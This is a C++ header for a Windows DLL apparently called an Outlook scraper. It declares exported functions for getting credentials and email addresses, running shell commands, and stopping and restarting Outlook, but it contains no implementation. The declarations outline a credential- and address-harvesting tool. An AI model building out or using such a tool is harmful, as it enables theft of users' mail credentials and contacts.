#pragma once

#include "pch.h"
#include "stdio.h"
#include <mapi.h>
#include <tchar.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>
#include <array>
#include <memory>
#include <cstdio>

typedef BOOL(WINAPI* FGetComponentPathPtr)(LPCSTR, LPSTR, LPSTR, DWORD, BOOL);

#ifndef OUTLOOK_H
#define OUTLOOK_H

#ifdef OUTLOOKSCRAPER
#define OUTLOOKSCRAPER __declspec(dllexport)
#else
#define OUTLOOKSCRAPER __declspec(dllimport)
#endif

// Exported functions
extern "C" OUTLOOKSCRAPER BOOL __cdecl getCredentials(char *str, int length, bool stop, bool restart);
extern "C" OUTLOOKSCRAPER BOOL __cdecl getEmailAddresses(char *str, int length, bool stop, bool restart);

// Other functions
OUTLOOKSCRAPER std::string executeCmd(const char* cmd);
OUTLOOKSCRAPER BOOL stopOutlook();
OUTLOOKSCRAPER BOOL startOutlook();

#endif